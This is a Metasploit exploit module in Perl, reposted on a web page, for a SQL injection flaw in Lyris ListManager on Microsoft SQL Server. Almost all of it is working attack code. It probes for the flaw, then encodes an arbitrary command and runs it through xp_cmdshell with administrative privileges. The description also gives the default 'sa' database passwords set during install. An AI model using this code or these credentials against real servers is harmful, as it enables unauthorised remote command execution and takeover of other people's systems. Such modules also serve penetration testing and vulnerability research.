Lyris ListManager Read Message Attachment SQL Injection Exploit
===============================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::lyris_attachment_mssql;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	&#039;Name&#039;  => &#039;Lyris ListManager Attachment SQL Injection (MSSQL)&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.2 $&#039;,
	&#039;Authors&#039; => [ &#039;H D Moore <hdm [at] metasploit.com>&#039;, ],
	&#039;Arch&#039;  => [ ],
	&#039;OS&#039;    => [ &#039;win32&#039; ],
	&#039;Priv&#039;  => 1,
	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 80],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
	  },

	&#039;Payload&#039; =>
	  {
	  	&#039;Space&#039; => 1000,
		&#039;Keys&#039;  => [&#039;cmd&#039;],
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
		This module exploits a SQL injection flaw in the Lyris ListManager
	software for Microsoft SQL Server. This flaw allows for arbitrary commands
	to be executed with administrative privileges by calling the xp_cmdshell
	stored procedure. Additionally, a window of opportunity is opened during the
	ListManager for MSDE install process; the &#039;sa&#039; account is set to the password &#039;lminstall&#039;
	for a 5-10 minute period. After the installer finishes, the password is
	permanently set to &#039;lyris&#039; followed by the process ID of the installer (a 1-5 digit number).
}),

	&#039;Refs&#039;  =>
	  [
		[&#039;URL&#039;,   &#039;http://metasploit.com/research/vulns/lyris_listmanager/&#039;],
		[&#039;OSVDB&#039;, &#039;21548&#039;],
	  ],
	  
	&#039;DefaultTarget&#039; => 0,
	&#039;Targets&#039; =>
	  [
		[&#039;No target needed.&#039;],
	  ],

	&#039;Keys&#039; => [&#039;lyris&#039;],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return $self->CheckCode(&#039;Connect&#039;);
	}

	$s->Send("GET /read/attachment/&#039; HTTP/1.1\r\nHost: $target_host:$target_port\r\n\r\n");

	my $r = $s->Recv(-1, 5);

	if ($r =~ /Unclosed quotation mark before/) {
		$self->PrintLine("[*] Vulnerable installation detected ;)");
		return $self->CheckCode(&#039;Detected&#039;);
	}
	
	if ($r =~ /SQL error reported from Lyris/) {
		$self->PrintLine("[*] Vulnerable installation, but not running MSSQL.");
		return $self->CheckCode(&#039;Safe&#039;);
	}
	
	if ($r =~ /ListManagerWeb.*Content-Length: 0/sm) {
		$self->PrintLine("[*] This system appears to be patched");
		return $self->CheckCode(&#039;Safe&#039;);	
	}
	
	$self->PrintLine("[*] Unknown response, patched or invalid target.");
	return $self->CheckCode(&#039;Safe&#039;);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);

	my $cmd = $self->GetVar(&#039;EncodedPayload&#039;)->RawPayload;

	my $sql = 
		&#039;DECLARE @X NVARCHAR(4000);&#039;.
		&#039;SET @X= &#039;;

	foreach my $c (unpack(&#039;C*&#039;, $cmd)) {
		$sql .= "CHAR($c) + ";
	}
	$sql .= "&#039;\x20&#039;;";
	$sql .= &#039;EXEC MASTER..XP_CMDSHELL @X&#039;;

	my $url = "/read/attachment/1;".$self->URLEncode($sql).";--";


	my $request =
	  "GET $url HTTP/1.1\r\n".
	  "Host: $target_host:$target_port\r\n\r\n";

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
	$s->Send($request);

	$self->PrintLine("[*] Waiting for a response...");
	$s->Recv(-1, 10);
	$self->Handler($s);
	$s->Close();
	return;
}

sub URLEncode {
	my $self = shift;
	my $data = shift;
	my $res;

	foreach my $c (unpack(&#039;C*&#039;, $data)) {
		if (
			($c >= 0x30 && $c <= 0x39) ||
			($c >= 0x41 && $c <= 0x5A) ||
			($c >= 0x61 && $c <= 0x7A)
		  ) {
			$res .= chr($c);
		} else {
			$res .= sprintf("%%%.2x", $c);
		}
	}
	return $res;
}

1;



